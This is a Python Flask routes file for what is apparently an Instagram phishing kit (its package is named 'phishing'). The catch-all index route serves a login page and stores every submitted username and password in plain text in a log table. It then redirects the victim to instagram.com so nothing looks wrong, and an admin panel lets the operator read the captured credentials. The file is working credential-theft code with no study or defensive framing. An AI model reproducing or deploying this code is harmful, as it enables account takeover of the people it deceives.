from . import app, db
from flask import render_template, request, redirect, url_for, flash
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import login_user, current_user, logout_user
from phishing.models import Log, User
from datetime import datetime
from .forms import LoginForm, ChangePasswordForm


@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not current_user.is_authenticated:
        return redirect(url_for('admin_login'))
    form = ChangePasswordForm()
    if form.validate_on_submit():
        password = request.form.get('password')
        user = User.query.get(current_user.id)
        user.password = generate_password_hash(password=password)
        db.session.commit()
        flash('Password successfully changed', category="success")
    else:
        if request.method == 'POST':
            flash('Something went wrong', category="danger")
    logs = Log.query.all()
    return render_template('admin_panel.html', logs=logs, form=form, title="Admin Panel")


@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    form = LoginForm(request.form)
    if form.validate_on_submit():
        username = request.form.get('username')
        password = request.form.get('password')
        remember = True if request.form.get('remember') else False
        user = User.query.filter_by(username=username).first()
        if not user or not check_password_hash(user.password, password):
            flash('Invalid login/password')
            return render_template('admin_login.html', form=form, title='Admin Panel - Login')
        login_user(user, remember=remember)
        return redirect(url_for('admin'))
    if current_user.is_authenticated:
        return redirect(url_for('admin'))
    return render_template('admin_login.html', form=form, title='Admin Panel - Login')


@app.route('/admin/logout')
def admin_logout():
    logout_user()
    return redirect(url_for("index"))


@app.route('/<path:subpath>', methods=['GET', 'POST'])
@app.route('/', methods=['GET', 'POST'])
def index(subpath=""):
    print(subpath)
    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        log_to_create = Log(username=username,
                            password=password, date=datetime.now())
        db.session.add(log_to_create)
        db.session.commit()
        redir = redirect(f"https://instagram.com/{subpath}", code=301)
        return redir
    return render_template('index.html', subpath=subpath)
